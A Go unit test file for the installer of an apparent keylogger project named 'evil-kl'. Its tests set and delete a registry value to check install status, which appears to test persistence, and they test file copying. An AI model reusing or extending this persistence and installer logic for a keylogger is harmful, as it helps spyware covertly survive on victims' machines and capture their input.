package installer

import (
	"os"
	"testing"

	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/registry"
)

func TestInstaller_isInstalled(t *testing.T) {
	configInst := new(config.Config).Create()
	cfg := configInst.GetConfig()

	registryInst := new(registry.Registry).Create()

	tests := []struct {
		name string
		i    *Installer
		want bool
	}{
		{
			name: "success installed",
			i:    new(Installer).Create(cfg.Keylogger.Path, cfg.Installer),
			want: true,
		},
		{
			name: "not installed",
			i:    new(Installer).Create(cfg.Keylogger.Path, cfg.Installer),
			want: false,
		},
	}

	for _, tt := range tests {
		if tt.name == "success installed" {
			registryInst.SetStringValue(cfg.Installer.RegPath, cfg.Installer.RegName, cfg.Installer.ServicePath)
		}

		t.Run(tt.name, func(t *testing.T) {
			if tt.name == "success installed" {
				registryInst.SetStringValue(cfg.Installer.RegPath, cfg.Installer.RegName, cfg.Installer.ServicePath)
			}

			if got := tt.i.isInstalled(); got != tt.want {
				t.Errorf("Installer.isInstalled() = %v, want %v", got, tt.want)
			}

			registryInst.DeleteStringValue(cfg.Installer.RegPath, cfg.Installer.RegName)
		})
	}
}

func TestInstaller_copyFiles(t *testing.T) {
	type args struct {
		sourcePath string
		copyPath   string
	}
	tests := []struct {
		name    string
		i       *Installer
		args    args
		wantErr bool
	}{
		{
			name: "success copy",
			i:    new(Installer).Create("", config.Installer{}),
			args: args{
				sourcePath: "./srcFile",
				copyPath:   "./copyFile",
			},
			wantErr: false,
		},
		{
			name: "failed copy: file is not exist",
			i:    new(Installer).Create("", config.Installer{}),
			args: args{
				sourcePath: "./srcFile",
				copyPath:   "./copyFile",
			},
			wantErr: true,
		},
		{
			name: "failed copy: empty src path",
			i:    new(Installer).Create("", config.Installer{}),
			args: args{
				sourcePath: "",
				copyPath:   "./copyFile",
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.name == "success copy" {
				f, _ := os.OpenFile("./srcFile", os.O_CREATE, 0600)
				f.Close()
			}

			if err := tt.i.copyFiles(tt.args.sourcePath, tt.args.copyPath); (err != nil) != tt.wantErr {
				t.Errorf("Installer.copyFiles() error = %v, wantErr %v", err, tt.wantErr)
			}

			os.Remove("./srcFile")
			os.Remove("./copyFile")
		})
	}
}
